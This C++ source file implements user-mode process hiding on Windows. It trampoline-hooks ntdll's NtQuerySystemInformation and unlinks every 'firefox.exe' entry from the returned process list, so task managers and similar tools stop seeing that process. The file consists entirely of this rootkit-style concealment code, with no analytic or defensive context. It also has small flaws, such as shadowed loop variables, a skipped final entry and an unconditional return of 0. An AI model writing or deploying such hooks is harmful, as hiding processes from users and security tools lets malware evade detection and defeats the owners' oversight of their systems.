#include "main.h"
#include <winternl.h>
#include <ntstatus.h>
#include "hooking.h"

/*
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45,
    SystemCodeIntegrityInformation = 103,
    SystemPolicyInformation = 134,
} SYSTEM_INFORMATION_CLASS;
*/

/*
__kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);*/

typedef NTSTATUS(WINAPI *tNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SysInfoClass, PVOID SysInfo, ULONG SysInfoLen, PULONG ReturnLength);
tNtQuerySystemInformation oNtQuerySystemInformation = nullptr;
NTSTATUS WINAPI hkNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SysInfoClass, PVOID SysInfo, ULONG SysInfoLen, PULONG ReturnLength)
{

    NTSTATUS status = oNtQuerySystemInformation(SysInfoClass, SysInfo, SysInfoLen, ReturnLength);

    if (SysInfoClass != SYSTEM_INFORMATION_CLASS::SystemProcessInformation)
        return status;

    if (status != STATUS_SUCCESS)
        return status;

	SYSTEM_PROCESS_INFORMATION* pLastEntry = nullptr;
	SYSTEM_PROCESS_INFORMATION* pEntry = (SYSTEM_PROCESS_INFORMATION*)SysInfo;
	for (
		SYSTEM_PROCESS_INFORMATION *pLastEntry = nullptr, *pEntry = (SYSTEM_PROCESS_INFORMATION*)SysInfo;

		pEntry->NextEntryOffset != 0;
		pEntry = (SYSTEM_PROCESS_INFORMATION*)((unsigned char*)pEntry + pEntry->NextEntryOffset)
		)
	{
		// there can be multiple same-name process instances right next to eachother
		// gotta skip over the whole bunch so we track the top of the 'bunch' and skip from there
		if (wcsncmp(pEntry->ImageName.Buffer, L"firefox.exe", pEntry->ImageName.Length))
		{
			pLastEntry = pEntry;
		}
		else if (pLastEntry)
		{
			if (!pEntry->NextEntryOffset)
			{
				pLastEntry->NextEntryOffset = 0;
				break;
			}
			pLastEntry->NextEntryOffset += pEntry->NextEntryOffset;
		}
	}

    return 0;
}

bool PatchHideProcess()
{
	HMODULE hMod = GetModuleHandleA("ntdll.dll");
	if (!hMod)
		return false;
	unsigned char* pTarget = (unsigned char*)GetProcAddress(hMod, "NtQuerySystemInformation");
	if (!pTarget)
		return false;

	oNtQuerySystemInformation = (tNtQuerySystemInformation)TrampHook(pTarget, hkNtQuerySystemInformation, 8);
	return true;
}